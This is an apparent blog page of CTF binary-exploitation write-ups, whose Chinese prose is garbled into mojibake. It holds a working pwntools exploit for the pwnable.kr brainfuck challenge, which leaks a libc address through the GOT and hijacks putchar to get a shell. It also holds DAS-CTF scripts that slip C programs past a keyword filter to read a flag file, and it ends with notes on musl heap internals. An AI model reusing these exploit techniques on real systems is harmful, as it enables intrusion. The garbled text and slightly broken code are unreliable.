<p>å‚ç…§ï¼š<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/216749.html" >Brain fuck-pwnable.krä¸‰ç§æ€è·¯è¯¦è§£ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>å…¶ä¸­å„ä¸ªåˆ†æ”¯ï¼ˆç¬¦å·ä»£è¡¨ï¼‰çš„åŠŸèƒ½ï¼Œå¯è§ä¸‹è¡¨ï¼šï¼ˆéƒ¨åˆ†æ¥æºäº<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/SmalOSnail/article/details/53679546#commentsedit" >TaQini</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>ï¼‰</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="center">æ“ä½œ</th>
<th align="center">å«ä¹‰</th>
<th align="center">è§£é‡Š</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&gt;</td>
<td align="center">p += 1</td>
<td align="center">på€¼åŠ 1</td>
</tr>
<tr>
<td align="center">&lt;</td>
<td align="center">p -= 1</td>
<td align="center">på€¼å‡1</td>
</tr>
<tr>
<td align="center">+</td>
<td align="center">(*p) += 1</td>
<td align="center">på€¼æŒ‡å‘çš„å€¼åŠ 1</td>
</tr>
<tr>
<td align="center">-</td>
<td align="center">(*p) -= 1</td>
<td align="center">på€¼æŒ‡å‘çš„å€¼å‡1</td>
</tr>
<tr>
<td align="center">.</td>
<td align="center">putchar(*p)</td>
<td align="center">è¾“å‡º</td>
</tr>
<tr>
<td align="center">,</td>
<td align="center">getchar(*p)</td>
<td align="center">è¾“å…¥</td>
</tr>
</tbody></table></div>
<p>ç®€å•æ¥è¯´å°±æ˜¯ï¼š<code>,.</code>åˆ†åˆ«æ§åˆ¶è¾“å…¥è¾“å‡ºï¼›<code>&lt;&gt;</code>æ§åˆ¶æŒ‡é’ˆpçš„å–å€¼åŠ å‡ï¼›<code>+-</code>æ§åˆ¶æŒ‡é’ˆpæŒ‡å‘çš„å†…å­˜ä¸Šçš„å€¼çš„åŠ å‡ã€‚</p>
<p>æ‰€ä»¥è¿™é‡Œå°±å¾ˆæ˜æ˜¾ï¼Œç”±äºæ²¡æœ‰å¯¹påšé™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ§åˆ¶æŒ‡é’ˆpæ¥ç§»åŠ¨åˆ°ä¸€ä¸ªèŒƒå›´å†…çš„ä»»æ„åœ°æ–¹</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091101187.png" alt="image-20220209110158154"></p>
<p>æœ€å¤šç§»åŠ¨1024æ¬¡ï¼Œä¹Ÿå°±æ˜¯åœ¨å¦‚ä¸‹èŒƒå›´å¤„</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;tape Â± 1024</span><br></pre></td></tr></table></div></figure>

<p>åˆç”±äºtapeåœ¨bssæ®µä¸Šï¼Œè·ç¦»Gotè¡¨æ¯”è¾ƒè¿‘ï¼Œå¹¶ä¸”å®é™…ä¸Šåœ¨IDAä¸­æŸ¥çœ‹ä¹Ÿç¡®å®å¦‚æ­¤ï¼Œé‚£ä¹ˆä¹‹åæˆ‘ä»¬å°±å¯ä»¥å€ŸåŠ©<code>,</code>æ¥è¾“å‡ºgotè¡¨ä¸­å†…å®¹ï¼Œæ³„éœ²åœ°å€ï¼Œç„¶åä¿®æ”¹putcharçš„gotè¡¨ï¼Œç›´æ¥è·³è½¬one_gadgetå³å¯ã€‚</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./bf&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">global</span> p</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> s:p.send(s)</span><br><span class="line">sl = <span class="keyword">lambda</span> s:p.sendline(s)</span><br><span class="line">rc = <span class="keyword">lambda</span> s:p.recv(s)</span><br><span class="line">ru = <span class="keyword">lambda</span> s:p.recvuntil(s)</span><br><span class="line">rl = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sa = <span class="keyword">lambda</span> a,s:p.sendafter(a,s)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,s:p.sendlineafter(a,s)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data   :u32(data.ljust(<span class="number">4</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data   :u64(data.ljust(<span class="number">8</span>, <span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">u64Leakbase = <span class="keyword">lambda</span> offset :u64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>: ] + <span class="string">&#x27;\0\0&#x27;</span>) - offset</span><br><span class="line">u32Leakbase = <span class="keyword">lambda</span> offset :u32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>: ]) - offset</span><br><span class="line">it      = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># address</span></span><br><span class="line">tape_addr = <span class="number">0x0804A0A0</span></span><br><span class="line">putchar_addr = <span class="number">0x0804A030</span></span><br><span class="line"><span class="comment"># build payload</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span> </span><br><span class="line">payload += <span class="string">&#x27;&lt;&#x27;</span> * (tape_addr - putchar_addr) <span class="comment"># move to putchar address(0x0804A030)</span></span><br><span class="line">payload += <span class="string">&#x27;.&#x27;</span> <span class="comment"># load putchar into plt (for the time to use putchar)</span></span><br><span class="line">payload += <span class="string">&#x27;.&gt;&#x27;</span> * <span class="number">0x4</span> <span class="comment"># load putchar real address</span></span><br><span class="line">payload += <span class="string">&#x27;&lt;&#x27;</span> * <span class="number">0x4</span> + <span class="string">&#x27;,&gt;&#x27;</span> * <span class="number">0x4</span> <span class="comment"># overload putchar</span></span><br><span class="line">payload += <span class="string">&#x27;.&#x27;</span> <span class="comment"># getshell</span></span><br><span class="line">log.info(<span class="string">&quot;start send&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;pwnable.kr&#x27;</span>,<span class="number">9001</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./bf&quot;)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;welcome to brainfuck testing system!!\ntype some brainfuck instructions except [ ]\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">libc_base_addr = u32Leakbase(libc.sym[<span class="string">&#x27;putchar&#x27;</span>])</span><br><span class="line">p.send(p32(libc_base_addr + <span class="number">0x5fbc6</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></div></figure>




        <h1 id="äºŒã€2020-RCTF-bf"   >
          <a href="#äºŒã€2020-RCTF-bf" class="heading-link"><i class="fas fa-link"></i></a><a href="#äºŒã€2020-RCTF-bf" class="headerlink" title="äºŒã€2020 RCTF bf"></a>äºŒã€2020 RCTF bf</h1>
      <p>è¿™é¢˜ä¸å¤ªæƒ³è°ƒï¼Œä¹Ÿæ˜¯brainFuckè¯­è¨€çš„ï¼Œä½†æ˜¯åœ¨<code>[]</code>çš„å®ç°ä¸Šæœ‰ç‚¹é—®é¢˜ï¼Œcodeåœ¨æ ˆä¸Šï¼Œä¼šå­˜åœ¨Off-by-oneçš„æƒ…å†µï¼Œåˆšå¥½æº¢å‡ºåˆ°code_addrï¼Œå¯é€šè¿‡ä¿®æ”¹code_addræ¥æ§åˆ¶ç¨‹åºæµä»è€Œè¿›è¡ŒROPã€‚</p>

        <h1 id="ä¸‰ã€2020-DAS-CTF-OJ0"   >
          <a href="#ä¸‰ã€2020-DAS-CTF-OJ0" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸‰ã€2020-DAS-CTF-OJ0" class="headerlink" title="ä¸‰ã€2020 DAS-CTF OJ0"></a>ä¸‰ã€2020 DAS-CTF OJ0</h1>
      <p>Cç¼–è¯‘å™¨ï¼Œæ²¡æœ‰é™„ä»¶ï¼Œè¿‡æ»¤äº†<code>home</code>ã€<code>ctf</code>ã€<code>flag</code>ç­‰æ•æ„Ÿå­—ç¬¦å’Œsystemï¼Œexecç±»çš„å‡½æ•°</p>

        <h2 id="è§£æ³•ä¸€ï¼šç›´æ¥è¯»å–"   >
          <a href="#è§£æ³•ä¸€ï¼šç›´æ¥è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•ä¸€ï¼šç›´æ¥è¯»å–" class="headerlink" title="è§£æ³•ä¸€ï¼šç›´æ¥è¯»å–"></a>è§£æ³•ä¸€ï¼šç›´æ¥è¯»å–</h2>
      <p>é€šè¿‡ç¼–å†™ç¨‹åºè¯»å–<code>/home/ctf/flag</code>ï¼Œç»•è¿‡è¿‡æ»¤</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">	char buff[128]=&#123;0&#125;, file[128]=&#123;0&#125;;</span></span><br><span class="line"><span class="string">	scanf(&quot;%s&quot;, file);</span></span><br><span class="line"><span class="string">	FILE* fp = fopen(file, &quot;r&quot;);</span></span><br><span class="line"><span class="string">	fscanf(fp, &quot;%s&quot;, buff);</span></span><br><span class="line"><span class="string">	printf(&quot;%s&quot;, buff);</span></span><br><span class="line"><span class="string">	return 0</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&#x27;@&#x27;)&quot;</span>, program)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;(Y/n)&quot;</span>, <span class="string">&quot;/home/ctf/flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>


        <h2 id="è§£æ³•äºŒï¼šæ‹¼æ¥è¯»å–"   >
          <a href="#è§£æ³•äºŒï¼šæ‹¼æ¥è¯»å–" class="heading-link"><i class="fas fa-link"></i></a><a href="#è§£æ³•äºŒï¼šæ‹¼æ¥è¯»å–" class="headerlink" title="è§£æ³•äºŒï¼šæ‹¼æ¥è¯»å–"></a>è§£æ³•äºŒï¼šæ‹¼æ¥è¯»å–</h2>
      <p>ç”±äºè¿‡æ»¤äº†ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•åƒWebé‡Œé¢çš„é‚£ç§æ‹¼æ¥è¯»å†™</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>, arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;183.129.189.60&quot;</span>, <span class="number">10075</span>)</span><br><span class="line"></span><br><span class="line">program = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include&lt;string.h&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">int main()&#123;</span></span><br><span class="line"><span class="string">    char buf[50]; </span></span><br><span class="line"><span class="string">    char path_part_1[5] = &quot;/hom&quot;; </span></span><br><span class="line"><span class="string">    char path_part_2[5] = &quot;e/ct&quot;; </span></span><br><span class="line"><span class="string">    char path_part_3[5] = &quot;f/fl&quot;; </span></span><br><span class="line"><span class="string">    char path_part_4[5] = &quot;agx00&quot;; </span></span><br><span class="line"><span class="string">    char path[20];</span></span><br><span class="line"><span class="string">    sprintf(path, &quot;%s%s%s%s&quot;, path_part_1, path_part_2, path_part_3, path_part_4);</span></span><br><span class="line"><span class="string">    int fd = open(path);</span></span><br><span class="line"><span class="string">    read(fd,buf,50);</span></span><br><span class="line"><span class="string">    write(1,buf,50);</span></span><br><span class="line"><span class="string">&#125;@</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;&#x27;@&#x27;)&quot;</span>, program)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></div></figure>




        <h1 id="å››ã€DEFCON-CTF-Qualifier-2020-introool"   >
          <a href="#å››ã€DEFCON-CTF-Qualifier-2020-introool" class="heading-link"><i class="fas fa-link"></i></a><a href="#å››ã€DEFCON-CTF-Qualifier-2020-introool" class="headerlink" title="å››ã€DEFCON CTF Qualifier 2020 introool"></a>å››ã€DEFCON CTF Qualifier 2020 introool</h1>
      <p>è¿™é¢˜ä¸å¤ªæƒ³è°ƒï¼Œå°±æ˜¯patchï¼Œå†™æ±‡ç¼–è·³è½¬shellcodeç­‰</p>

        <h1 id="äº”ã€-Redhat2019-Kaleidoscope"   >
          <a href="#äº”ã€-Redhat2019-Kaleidoscope" class="heading-link"><i class="fas fa-link"></i></a><a href="#äº”ã€-Redhat2019-Kaleidoscope" class="headerlink" title="äº”ã€[Redhat2019] Kaleidoscope"></a>äº”ã€[Redhat2019] Kaleidoscope</h1>
      <p>è¿™é¢˜æ‰¾ä¸ç€é™„ä»¶ï¼Œç®€å•æ¥è¯´å°±æ˜¯ä¸¤ä¸ªä¸œè¥¿<code>Kaleidoscope</code>å³æ—¶è§£é‡Šå™¨å’Œ<code>honggfuzz</code></p>

        <h1 id="å…­ã€2020-DAS-CTF-OJ1"   >
          <a href="#å…­ã€2020-DAS-CTF-OJ1" class="heading-link"><i class="fas fa-link"></i></a><a href="#å…­ã€2020-DAS-CTF-OJ1" class="headerlink" title="å…­ã€2020 DAS-CTF OJ1"></a>å…­ã€2020 DAS-CTF OJ1</h1>
      <p>ä¸èƒ½è¾“å…¥æ‹¬å·ï¼Œå¤§ä¸­å°æ‹¬å·ç­‰ï¼Œä¾‹å¦‚<code>int main()&#123;&#125;</code>ç­‰ç­‰éƒ½ä¸è¡Œï¼Œå¯ä»¥ç”¨å¦‚ä¸‹çš„å½¢å¼æ¥è¿›è¡Œ</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> main=<span class="number">0x55</span>,a1=<span class="number">0x48</span>,a2=<span class="number">0x89</span>,a3=<span class="number">0xe5</span>;</span><br></pre></td></tr></table></div></figure>

<p>ç¼–è¯‘ä¹‹åå¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼Œç›´æ¥å½¢æˆæ±‡ç¼–ä»£ç ï¼Œé‚£ä¹ˆå°±å¯ä»¥ç›´æ¥å†™æ±‡ç¼–é€šiè¿‡shellcodeæˆ–è€…orwæ¥è·å–flagäº†ã€‚</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091335752.png" alt="image-20220209133547687"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202091334057.png" alt="image-20220209133415993"></p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/01/22/Musl%E4%BB%8E0%E5%BC%80%E5%A7%8B/">Muslä»0å¼€å§‹</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-01-22</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-03-18</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="ä¸€ã€1-2-0åŠä»¥å‰ç‰ˆæœ¬"   >
          <a href="#ä¸€ã€1-2-0åŠä»¥å‰ç‰ˆæœ¬" class="heading-link"><i class="fas fa-link"></i></a><a href="#ä¸€ã€1-2-0åŠä»¥å‰ç‰ˆæœ¬" class="headerlink" title="ä¸€ã€1.2.0åŠä»¥å‰ç‰ˆæœ¬"></a>ä¸€ã€1.2.0åŠä»¥å‰ç‰ˆæœ¬</h1>
      
        <h2 id="1-æ•°æ®ç»“æ„"   >
          <a href="#1-æ•°æ®ç»“æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-æ•°æ®ç»“æ„" class="headerlink" title="1.æ•°æ®ç»“æ„"></a>1.æ•°æ®ç»“æ„</h2>
      
        <h3 id="1-chunkç»“æ„"   >
          <a href="#1-chunkç»“æ„" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-chunkç»“æ„" class="headerlink" title="(1)chunkç»“æ„"></a>(1)chunkç»“æ„</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 å®šä¹‰åœ¨src/internal/malloc_impl.hä¸­</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> &#123;</span></span><br><span class="line">    <span class="keyword">size_t</span> psize, csize; <span class="comment">// ç›¸å½“äº glibc çš„ prev size å’Œ size</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">next</span>, *<span class="title">prev</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>â‘ ä¸é‡ç”¨psizeå­—æ®µ</p>
<p>â‘¡psizeå’Œsizeéƒ½æœ‰inuseæ ‡å¿—ä½ï¼Œåˆ†åˆ«ä»£è¡¨å‰ä¸€ä¸ªchunkå’Œå½“å‰chunkçš„ä½¿ç”¨çŠ¶æ€ã€‚</p>

        <h3 id="2-å †ç®¡ç†ç»“æ„mal"   >
          <a href="#2-å †ç®¡ç†ç»“æ„mal" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-å †ç®¡ç†ç»“æ„mal" class="headerlink" title="(2)å †ç®¡ç†ç»“æ„mal"></a>(2)å †ç®¡ç†ç»“æ„mal</h3>
      <p>ç±»ä¼¼äºarenaï¼Œè®°å½•å †ä¸­çš„ç›¸å…³çŠ¶æ€ï¼Œbinsç»“æ„ä½“ç­‰</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0  å®šä¹‰åœ¨src/malloc/malloc.cä¸­</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">uint64_t</span> binmap; <span class="comment">//64ä½æ— ç¬¦å·æ•´æ•°binmap</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">bin</span> <span class="title">bins</span>[64];</span></span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">int</span> free_lock[<span class="number">2</span>];</span><br><span class="line">&#125; mal;</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-bitmap"   >
          <a href="#3-bitmap" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-bitmap" class="headerlink" title="(3)bitmap:"></a>(3)bitmap:</h3>
      <p><code>binmap</code>è®°å½•æ¯ä¸ª bin æ˜¯å¦ä¸ºéç©ºï¼Œè‹¥å¯¹åº”æŸä¸ªæ¯”ç‰¹ä½ä¸º 1ï¼Œåˆ™è¡¨ç¤ºå¯¹åº”çš„ bin ä¸ºéç©ºï¼Œå­˜åœ¨chunk</p>
<p>åœ¨unbinå‡½æ•°æ“ä½œè¿‡ç¨‹ä¸­ï¼Œå¦‚æœæ“ä½œçš„chunk(C)çš„prevå’ŒnextæŒ‡é’ˆç›¸ç­‰ï¼Œå°±ä¼šå°†å¯¹åº”çš„binçš„bitmapè®¾ç½®ä¸º0ï¼Œä½¿å…¶å¤„äºç½®ç©ºçš„çŠ¶æ€ã€‚</p>

        <h3 id="4-bins"   >
          <a href="#4-bins" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-bins" class="headerlink" title="(4)bins"></a>(4)bins</h3>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v1.2.0 å®šä¹‰åœ¨src/internal/malloc_impl.hä¸­</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bin</span> &#123;</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="keyword">int</span> lock[<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">head</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">tail</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>

<p>æ„æˆç±»ä¼¼unsortedbinçš„åŒå‘å¾ªç¯é“¾è¡¨ï¼Œå½“é“¾è¡¨ä¸ºç©ºæ—¶ï¼Œ<code>head</code>å’Œ<code>tail</code>æŒ‡é’ˆç­‰äº 0 æˆ–è€…æŒ‡å‘é“¾è¡¨å¤´éƒ¨è‡ªèº«ã€‚</p>
<p>æ¯ä¸ªbinå­˜å‚¨çš„chunkèŒƒå›´å¦‚ä¸‹</p>
<div class="table-container"><table>
<thead>
<tr>
<th align="left">bin ä¸‹æ ‡ i</th>
<th align="left">chunk å¤§å°ä¸ªæ•°</th>
<th align="center">chunk å¤§å°èŒƒå›´</th>
<th align="center">ä¸‹æ ‡ i ä¸ chunk å¤§å°èŒƒå›´çš„å…³ç³»</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0-31</td>
<td align="left">1</td>
<td align="center">0x20 â€“ 0x400</td>
<td align="center">(i+1) * 0x20</td>
</tr>
<tr>
<td align="left">32-35</td>
<td align="left">8</td>
<td align="center">0x420 â€“ 0x800</td>
<td align="center">(0x420+(i-32) <em>0x100) ~ (0x500+(i-32)</em> 0x100)</td>
</tr>
<tr>
<td align="left">36-39</td>
<td align="left">16</td>
<td align="center">0x820 â€“ 0x1000</td>
<td align="center">(0x820+(i-36) <em>0x200) ~ (0x1000+(i-36)</em> 0x200)</td>
</tr>
<tr>
<td align="left">40-43</td>
<td align="left">32</td>
<td align="center">0x1020 â€“ 0x2000</td>
<td align="center">(0x1020+(i-40) <em>0x400) ~ (0x1400+(i-40)</em> 0x400)</td>
</tr>
<tr>
<td align="left">44-47</td>
<td align="left">64</td>
<td align="center">0x2020 â€“ 0x4000</td>
<td align="center">(0x2020+(i-44) <em>0x800) ~ (0x2800+(i-44)</em> 0x800)</td>
</tr>
<tr>
<td align="left">48-51</td>
<td align="left">128</td>
<td align="center">0x4020 â€“ 0x8000</td>
<td align="center">(0x4020+(i-48) <em>0x1000) ~ (0x5000+(i-48)</em> 0x1000)</td>
</tr>
<tr>
<td align="left">52-55</td>
<td align="left">256</td>
<td align="center">0x8020 â€“ 0x10000</td>
<td align="center">(0x8020+(i-52) <em>0x2000) ~ (0xa000+(i-52)</em> 0x2000)</td>
</tr>
<tr>
<td align="left">56-59</td>
<td align="left">512</td>
<td align="center">0x10020 â€“ 0x20000</td>
<td align="center">(0x10020+(i-56) <em>0x4000) ~ (0x14000+(i-56)</em> 0x4000)</td>
</tr>
<tr>
<td align="left">60-62</td>
<td align="left">1024</td>
<td align="center">0x20020 â€“ 0x38000</td>
<td align="center">(0x20020+(i-60) <em>0x8000) ~ (0x28000+(i-60)</em> 0x8000)</td>
</tr>
<tr>
<td align="left">63</td>
<td align="left">æ— é™</td>
<td align="center">0x38000 ä»¥ä¸Š</td>
<td align="center">0x38000 ~</td>
</tr>
</tbody></table></div>
<p>å‰ 32 ä¸ª bin ç±»ä¼¼ fastbinå’Œsmallbinï¼Œæ¯ä¸ª bin åªå¯¹åº”ä¸€ç§å¤§å°çš„ chunkï¼Œä½†æ˜¯ä¹Ÿæ˜¯åŒå‘å¾ªç¯é“¾è¡¨ï¼Œç¬¬ä¸€ä¸ªé‡Šæ”¾åˆ°binsä¸­çš„chunkéƒ½ä¼šä½¿å¾—nextå’ŒprevæŒ‡é’ˆå¸¦ä¸Šlibcåœ°å€ã€‚</p>
<p>åé¢çš„åˆ™ç±»ä¼¼largebinï¼Œå¯¹åº”å¤šç§èŒƒå›´å¤§å°çš„chunkã€‚</p>

        <h2 id="2-ç»´æŠ¤æ–¹å¼"   >
          <a href="#2-ç»´æŠ¤æ–¹å¼" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-ç»´æŠ¤æ–¹å¼" class="headerlink" title="2.ç»´æŠ¤æ–¹å¼"></a>2.ç»´æŠ¤æ–¹å¼</h2>
      <p>åœ¨ 64 ä½ç³»ç»Ÿä¸‹ chunk å¤§å°æ˜¯ä»¥ 32 å­—èŠ‚å¯¹é½çš„ï¼Œè¿™ä¸ glibc 16 å­—èŠ‚å¯¹é½ä¸åŒï¼Œæ•… chunk å¤§å°æœ€å°ä¸º 0x20 å­—èŠ‚ï¼Œç„¶åæŒ‰ 0x40ã€0x60ã€0x80â€¦ é€æ¸é€’å¢ï¼Œä¸å…±ç”¨psizeä½ï¼Œæ‰€ä»¥æ¯æ¬¡éƒ½ä¼šå°†ç”³è¯·çš„size+0x10ã€‚</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">malloc(0x10)-&gt;0x20</span><br><span class="line">malloc(0x11)-&gt;0x40</span><br><span class="line">malloc(0x2f)-&gt;0x40</span><br><span class="line">malloc(0x30)-&gt;0x40</span><br><span class="line">malloc(0x31)-&gt;0x60</span><br></pre></td></tr></table></div></figure>

<p>ç»´æŠ¤é“¾è¡¨çš„æ–¹å¼æ˜¯ FILOï¼ˆä»é“¾è¡¨é¦–éƒ¨å–å‡º chunkï¼Œä»å°¾éƒ¨æ’å…¥ chunkï¼‰ï¼Œå¹¶ä¸”éƒ½æ˜¯åŒå‘å¾ªç¯é“¾è¡¨</p>
<p>æ²¡æœ‰å®ç°å¦‚<code>__malloc_hook</code>ã€<code>__free_hook</code>ä¹‹ç±»çš„ hook å‡½æ•°</p>

        <h2 id="3-å…³é”®å‡½æ•°"   >
